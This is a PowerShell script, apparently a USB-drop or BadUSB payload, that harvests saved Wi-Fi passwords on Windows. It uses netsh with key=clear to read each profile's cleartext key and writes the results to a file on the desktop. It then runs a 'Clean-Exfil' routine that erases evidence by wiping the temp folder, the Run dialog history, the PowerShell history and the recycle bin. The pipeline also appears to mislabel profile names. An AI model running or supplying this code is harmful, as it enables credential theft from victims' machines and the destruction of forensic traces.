$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
    $name = $_.Matches.Groups[1].Value.Trim()
    $_ | Out-Null
    (netsh wlan show profile name="$name" key=clear)
} | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
    $pass = $_.Matches.Groups[1].Value.Trim()
    $_ | Out-Null
    [PSCustomObject]@{
        PROFILE_NAME = $name
        PASSWORD = $pass
    }
} | Format-Table -AutoSize | Out-String

$filePath = "$env:USERPROFILE\Desktop\wifi-pass.txt"
$wifiProfiles | Out-File -FilePath $filePath

function Clean-Exfil {
    # 清空临时文件夹
    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

    # 删除运行框历史记录
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

    # 删除 PowerShell 历史记录
    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

    # 清空回收站
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

if (-not ([string]::IsNullOrEmpty($ce))) {
    Clean-Exfil
}
